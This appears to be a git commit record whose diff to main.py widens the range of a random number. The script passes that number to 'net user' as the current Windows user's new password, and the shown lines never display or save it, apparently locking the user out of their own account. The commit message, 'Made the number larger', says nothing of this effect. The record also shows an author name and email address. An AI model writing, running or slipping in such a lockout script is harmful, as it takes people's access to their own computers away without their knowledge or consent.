fa151b38436a417620b36f2b27a18f691b34c171
Zacoru <p.rand.gallagher@gmail.com>
2016-02-07 15:54:52 -0500

    Made the number larger

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import os
 import random
 import getpass
 
-x = random.randint(100000, 999999)
+x = random.randint(100000000, 1000000000)
 
 os.system("net user {0} {1}".format(getpass.getuser(), x))
 
